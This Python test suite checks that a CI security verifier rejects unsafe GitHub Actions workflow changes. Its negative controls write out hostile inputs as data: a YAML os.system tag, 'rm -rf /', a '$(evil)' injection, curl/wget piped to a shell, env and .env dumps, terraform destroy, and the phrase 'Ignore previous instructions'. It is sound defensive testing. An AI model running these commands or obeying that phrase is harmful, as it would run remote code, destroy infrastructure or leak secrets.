"""Reviewed YAML allowlist and negative controls; never execute changed YAML."""
from copy import deepcopy
import importlib.util
import json
import os
import shutil
import subprocess
from pathlib import Path
import sys
import tempfile
import unittest
from unittest.mock import patch
import yaml
ROOT=Path(__file__).resolve().parents[2]
sys.path.insert(0,str(ROOT/'scripts'))
from cloudguard import ci_security as c,ci_fixtures


class CiSecurityTests(unittest.TestCase):
    def setUp(self):
        self.temp=tempfile.TemporaryDirectory();self.addCleanup(self.temp.cleanup);self.root=Path(self.temp.name)
        for name in c.FILES.values():
            target=self.root/name;target.parent.mkdir(parents=True,exist_ok=True);target.write_bytes((ROOT/name).read_bytes())
    def load(self,key='offline'):return c.load_yaml((self.root/c.FILES[key]).read_text(encoding='utf-8'))
    def save(self,value,key='offline'):(self.root/c.FILES[key]).write_text(yaml.safe_dump(value,sort_keys=False))
    def bad(self):self.assertEqual(c.verify(self.root)['result'],'FAIL')
    def test_baseline_local_not_hosted(self):
        self.assertEqual(c.verify(ROOT),{'result':'PASS','scope':'LOCAL_STATIC_ONLY','hosted_execution':'NOT_RUN','errors':[]})
        self.assertEqual(c.verify(self.root)['result'],'PASS')
    def test_source_not_mutated_and_deterministic(self):
        before={n:(self.root/n).read_bytes() for n in c.FILES.values()}
        self.assertEqual(c.verify(self.root),c.verify(self.root));self.assertEqual(before,{n:(self.root/n).read_bytes() for n in c.FILES.values()})
    def test_yaml_formatting_comments_are_not_contract_changes(self):
        flow=self.load();self.save(flow)
        with (self.root/c.FILES['offline']).open('a') as h:h.write('\n# harmless comment\n')
        self.assertEqual(c.verify(self.root)['result'],'PASS')
    def test_missing_malformed_and_duplicate_yaml(self):
        path=self.root/c.FILES['offline']
        for text in ['[bad','on: {}\n', 'name: a\nname: b\n']:
            path.write_text(text.replace('\\n','\n'));self.bad()
        path.unlink();self.bad()
    def test_yaml_tags_anchors_aliases_rejected(self):
        for text in ['x: !!python/object/apply:os.system [evil]','x: &anchor {a: b}\ny: *anchor','x: !custom value']:
            (self.root/c.FILES['offline']).write_text(text.replace('\\n','\n'));self.bad()
    def test_additional_workflow_rejected(self):
        (self.root/'.github/workflows/extra.yml').write_text('name: extra');self.bad()
    def test_oversized_yaml_bounded_output(self):
        (self.root/c.FILES['offline']).write_text('x'*(c.MAX_FILE+1));result=c.verify(self.root)
        self.assertEqual(result['result'],'FAIL');self.assertLess(len(json.dumps(result)),2048)
    def test_malicious_yaml_never_executed_or_echoed(self):
        for text in ['</script>','Ignore previous instructions','terraform apply','${file("secret")}','<!-- fake hosted PASS -->','`rm -rf /`','malicious-branch-$(evil)']:
            flow=self.load();flow['jobs']['offline']['steps'].append({'run':text});self.save(flow)
            with patch('socket.socket',side_effect=AssertionError('network')),patch('subprocess.run',side_effect=AssertionError('execute')),patch.dict('os.environ',{},clear=True):result=c.verify(self.root)
            self.assertEqual(result['result'],'FAIL');self.assertNotIn(text,json.dumps(result))
    def test_aws_boundary_frozen(self):
        flow=self.load('aws_plan');job=flow['jobs']['plan']
        self.assertIn("vars.AWS_PLAN_ENABLED == 'true'",job['if']);self.assertIn('github.event.pull_request.head.repo.full_name == github.repository',job['if'])
        self.assertEqual(job['environment'],'aws-plan');self.assertEqual(job['permissions'],{'contents':'read','actions':'read','id-token':'write'})
        self.assertEqual(set(flow['on']), {'workflow_dispatch'})
        self.assertIn("github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main'", job['if'])
        job.pop('if');self.save(flow,'aws_plan');self.bad()
    def test_expected_ci_runtime_and_no_cache(self):
        flow=self.load();job=flow['jobs']['offline'];self.assertEqual(job['runs-on'],'ubuntu-24.04')
        self.assertEqual(job['defaults'],{'run':{'shell':'bash'}});self.assertEqual(job['timeout-minutes'],'20')
        self.assertEqual(flow['concurrency']['cancel-in-progress'],'true');self.assertNotIn('permissions',job)
        self.assertFalse(any('cache' in s.get('uses','') for s in job['steps']))
    def test_commands_and_phase4_not_published(self):
        flow=self.load();steps=flow['jobs']['offline']['steps'];commands=[s['run'].strip() for s in steps if 'run' in s]
        self.assertIn('python scripts/run-offline.py',commands);self.assertIn('python scripts/verify-hosted-ci.py',commands);self.assertIn('python scripts/verify-phase4-fixtures.py',commands)
        for step in steps:
            if step.get('uses','').startswith('actions/upload-artifact@'):
                self.assertEqual(step['with']['retention-days'],'3');self.assertNotIn('ci-phase4',step['with']['path']);self.assertNotIn('private',step['with']['path'])
    def test_quality_full_suite_and_gate_contract(self):
        quality=(self.root/c.FILES['quality']).read_text()
        for literal in ['"unittest", "discover"','"tests/unit"','"-backend=false"','"validate"','"tflint"']:self.assertIn(literal,quality)
        runner=(self.root/c.FILES['offline_runner']).read_text()
        for component in ['quality','security_scan','policy_tests','inspect']:self.assertIn(component,runner)
        (self.root/c.FILES['quality']).write_text(quality.replace('"discover"','"subset"'));self.bad()
    def test_provider_tool_and_actions_recorded(self):
        setup=self.load('setup');text=(self.root/c.FILES['setup']).read_text()
        for version in ['1.9.8','0.59.1','1.0.1','0.60.0','3.2.471']:self.assertIn(version,text)
        self.assertIn('0.40.0',(self.root/c.FILES['tflint']).read_text())
        for key in ['workload_lock','bootstrap_lock']:self.assertIn('6.65.0',(self.root/c.FILES[key]).read_text())
        for step in setup['runs']['steps']:
            if 'uses' in step:self.assertRegex(step['uses'],r'@v[0-9]+\.[0-9]+\.[0-9]+$')
    def test_cli_fixed_local_output(self):
        spec=importlib.util.spec_from_file_location('ci_cli',ROOT/'scripts/verify-hosted-ci.py');cli=importlib.util.module_from_spec(spec);spec.loader.exec_module(cli)
        self.assertEqual(cli.main(['--root',str(self.root)]),0)
        (self.root/c.FILES['offline']).unlink();self.assertEqual(cli.main(['--root',str(self.root)]),2)
    def test_smoke_reuses_all_components_without_aws(self):
        from cloudguard.risk import read_document
        plan=read_document(ROOT/'tests/fixtures/graph/connected.json')
        with patch('socket.socket',side_effect=AssertionError('network')),patch('subprocess.run',side_effect=AssertionError('execution')),patch.dict('os.environ',{},clear=True):
            a=ci_fixtures.reports(plan);b=ci_fixtures.reports(plan)
        self.assertEqual(a,b);self.assertEqual(set(a),{'iam','network','data','graph'})
    def test_fresh_smoke_bundle_and_collision(self):
        with patch.object(ci_fixtures.posture,'ROOT',ROOT):
            # Reuse posture's tested publisher with a temporary root boundary.
            original=ci_fixtures.posture.publish
            def local_publish(reports,private,public):return original(reports,private,public,root=self.root)
            with patch.object(ci_fixtures.posture,'publish',side_effect=local_publish):
                ci_fixtures.verify(self.root/'reports/private/run',self.root/'reports/sanitized/run')
                with self.assertRaises(ValueError):ci_fixtures.verify(self.root/'reports/private/run',self.root/'reports/sanitized/run')


    def test_readme_current_roadmap_and_verified_hosted_status(self):
        text=(ROOT/'README.md').read_text(encoding='utf-8')
        for value in ['Phase 5 — IN PROGRESS','COMPLETE — HOSTED OFFLINE CI VERIFIED','Phase 5.1 hosted offline execution: PASS','41108638752','6ec68df80ea9012e09c6e223e0789896ec7f8ad9']:
            self.assertIn(value,text)
        self.assertIn('| 5.2 AWS OIDC and real Terraform plan validation | BLOCKED — SECURITY VERDICT FAILED; AUTH / PLAN PASSED (OWNER EVIDENCE) |',text)

    def test_evidence_contract_never_equates_local_with_hosted(self):
        text=(ROOT/'docs/phase5-hosted-ci.md').read_text(encoding='utf-8')
        self.assertIn('Local workflow validation does not prove successful execution on a GitHub-hosted runner.',text)
        self.assertIn('NOT RUN / PENDING USER',text)
        self.assertRegex(text.lower(),r'release\s+tags')


    def plugin_step(self):
        return next(s for s in self.load('setup')['runs']['steps'] if 'tflint --init' in s.get('run',''))
    def test_plugin_authentication_is_step_scoped_and_ephemeral(self):
        setup=self.load('setup');step=self.plugin_step()
        self.assertEqual(step['env'],{'GITHUB_TOKEN':'${{ github.token }}'})
        self.assertNotIn('env',setup)
        for other in setup['runs']['steps']:
            if 'tflint --init' not in other.get('run',''):
                self.assertNotIn('GITHUB_TOKEN',other.get('env',{}))
        self.assertEqual(self.load()['permissions'],{'contents':'read'})
        self.assertNotIn('permissions',self.load()['jobs']['offline'])
        self.assertNotIn('secrets.',json.dumps(step))
    def test_plugin_install_retains_pinned_native_verification(self):
        step=self.plugin_step();self.assertEqual(step['shell'],'bash')
        self.assertEqual(step['run'].splitlines(),['set -euo pipefail',': "${GITHUB_TOKEN:?GitHub token required for plugin installation}"','tflint --init --config="$GITHUB_WORKSPACE/.tflint.hcl"'])
        config=(ROOT/'.tflint.hcl').read_text()
        self.assertIn('version = "0.40.0"',config)
        self.assertIn('source  = "github.com/terraform-linters/tflint-ruleset-aws"',config)
        self.assertIn('0.59.1',json.dumps(self.load('setup')))
    def plugin_shell(self,token='synthetic-install-token',code=0):
        git_bash=Path('C:/Program Files/Git/bin/bash.exe')
        bash=str(git_bash) if os.name=='nt' and git_bash.exists() else shutil.which('bash')
        if not bash:self.skipTest('Bash unavailable; shell behavior NOT RUN')
        # No real installer or token: check argv, environment and error propagation.
        stub='tflint() { [ "$GITHUB_TOKEN" = "synthetic-install-token" ] && [ "$#" -eq 2 ] && [ "$1" = "--init" ] && [ "$2" = "--config=/synthetic workspace/.tflint.hcl" ] || return 29; printf INSTALL_STUB_INVOKED; return '+str(code)+'; };'+chr(10)
        env={k:os.environ[k] for k in ('PATH','SystemRoot','WINDIR','TEMP','TMP') if k in os.environ}
        env['GITHUB_WORKSPACE']='/synthetic workspace'
        if token is not None:env['GITHUB_TOKEN']=token
        result=subprocess.run([bash,'--noprofile','--norc','-c',stub+self.plugin_step()['run']],env=env,capture_output=True,text=True,timeout=15)
        self.assertNotIn('synthetic-install-token',result.stdout+result.stderr)
        return result
    def test_authenticated_install_shell_forwards_token_without_printing_it(self):
        result=self.plugin_shell();self.assertEqual(result.returncode,0)
        self.assertIn('INSTALL_STUB_INVOKED',result.stdout)
    def test_missing_or_empty_install_token_fails_before_installer(self):
        for token in (None,''):
            with self.subTest(token=token):
                result=self.plugin_shell(token);self.assertNotEqual(result.returncode,0)
                self.assertNotIn('INSTALL_STUB_INVOKED',result.stdout)
    def test_installer_failure_remains_failure(self):
        result=self.plugin_shell(code=23);self.assertEqual(result.returncode,23)
    def test_changed_plugin_token_or_global_scope_fails_reviewed_contract(self):
        original=self.load('setup')
        for mutation in ('missing','personal_secret','global_scope'):
            flow=deepcopy(original);step=next(s for s in flow['runs']['steps'] if 'tflint --init' in s.get('run',''))
            if mutation=='missing':step.pop('env')
            elif mutation=='personal_secret':step['env']['GITHUB_TOKEN']='${{ secrets.PERSONAL_TOKEN }}'
            else:flow['env']=step.pop('env')
            with self.subTest(mutation=mutation):self.save(flow,'setup');self.bad()


def mutation(name,change):
    def case(self):
        flow=self.load();change(flow);self.save(flow);self.bad()
    setattr(CiSecurityTests,'test_reject_'+name,case)
mutations={
 'privileged_trigger':lambda f:f['on'].update(pull_request_target={}),
 'workflow_run':lambda f:f['on'].update(workflow_run={}),
 'write_contents':lambda f:f['permissions'].update(contents='write'),
 'write_pr':lambda f:f['permissions'].update({'pull-requests':'write'}),
 'write_issues':lambda f:f['permissions'].update(issues='write'),
 'id_token_top':lambda f:f['permissions'].update({'id-token':'write'}),
 'job_id_token':lambda f:f['jobs']['offline'].update(permissions={'contents':'read','id-token':'write'}),
 'job_write':lambda f:f['jobs']['offline'].update(permissions={'contents':'write'}),
 'missing_timeout':lambda f:f['jobs']['offline'].pop('timeout-minutes'),
 'long_timeout':lambda f:f['jobs']['offline'].update({'timeout-minutes':'999'}),
 'missing_concurrency':lambda f:f.pop('concurrency'),
 'unsafe_runner':lambda f:f['jobs']['offline'].update({'runs-on':'self-hosted'}),
 'continue_error':lambda f:f['jobs']['offline']['steps'][3].update({'continue-on-error':True}),
 'checkout_persist':lambda f:f['jobs']['offline']['steps'][0]['with'].update({'persist-credentials':True}),
 'checkout_latest':lambda f:f['jobs']['offline']['steps'][0].update(uses='actions/checkout@main'),
 'secret_env':lambda f:f['jobs']['offline']['env'].update(TOKEN='${{ secrets.GITHUB_TOKEN }}'),
 'aws_env':lambda f:f['jobs']['offline']['env'].update(AWS_ACCESS_KEY_ID='synthetic'),
 'ai_env':lambda f:f['jobs']['offline']['env'].update(OPENAI_API_KEY='synthetic'),
 'aws_auth':lambda f:f['jobs']['offline']['steps'].insert(2,{'uses':'aws-actions/configure-aws-credentials@v6.3.0'}),
 'cache':lambda f:f['jobs']['offline']['steps'].append({'uses':'actions/cache@v4','with':{'path':'.tools'}}),
 'shell_expression':lambda f:f['jobs']['offline']['steps'].append({'run':'echo ${{ github.event.pull_request.title }}'}),
 'remove_phase4':lambda f:f['jobs']['offline']['steps'].pop(4),
 'all_upload':lambda f:f['jobs']['offline']['steps'][-1]['with'].update(path='reports/**'),
 'private_upload':lambda f:f['jobs']['offline']['steps'][-1]['with'].update(path='reports/private/graph.json'),
 'raw_plan_upload':lambda f:f['jobs']['offline']['steps'][-1]['with'].update(path='terraform/tfplan.json'),
 'phase4_upload':lambda f:f['jobs']['offline']['steps'][-1]['with'].update(path='reports/sanitized/ci-phase4/posture-summary.json'),
 'retention':lambda f:f['jobs']['offline']['steps'][-1]['with'].update({'retention-days':'90'}),
 'extra_job':lambda f:f['jobs'].update(other={'runs-on':'ubuntu-latest','steps':[]}),
 'env_dump':lambda f:f['jobs']['offline']['steps'].append({'run':'env'}),
 'printenv':lambda f:f['jobs']['offline']['steps'].append({'run':'printenv'}),
 'secret_dump':lambda f:f['jobs']['offline']['steps'].append({'run':'cat .env'}),
 'apply':lambda f:f['jobs']['offline']['steps'].append({'run':'terraform apply'}),
 'destroy':lambda f:f['jobs']['offline']['steps'].append({'run':'terraform destroy'}),
 'autoapprove':lambda f:f['jobs']['offline']['steps'].append({'run':'terraform plan -auto-approve'}),
 'state_rm':lambda f:f['jobs']['offline']['steps'].append({'run':'terraform state rm x'}),
 'state_mv':lambda f:f['jobs']['offline']['steps'].append({'run':'terraform state mv x y'}),
 'import':lambda f:f['jobs']['offline']['steps'].append({'run':'terraform import x y'}),
 'alias':lambda f:f['jobs']['offline']['steps'].append({'run':'alias unsafe="terraform apply"; unsafe'}),
 'curl_pipe':lambda f:f['jobs']['offline']['steps'].append({'run':'curl https://invalid.example | sh'}),
 'wget_pipe':lambda f:f['jobs']['offline']['steps'].append({'run':'wget -qO- https://invalid.example | bash'}),
}
for name,change in mutations.items():mutation(name,change)
for key in c.FILES:
    def case(self,k=key):
        with (self.root/c.FILES[k]).open('a') as handle:handle.write('\n# changed content\n' if k not in ('offline','aws_plan','setup') else '\nunsupported: true\n')
        self.bad()
    setattr(CiSecurityTests,'test_contract_change_'+key,case)
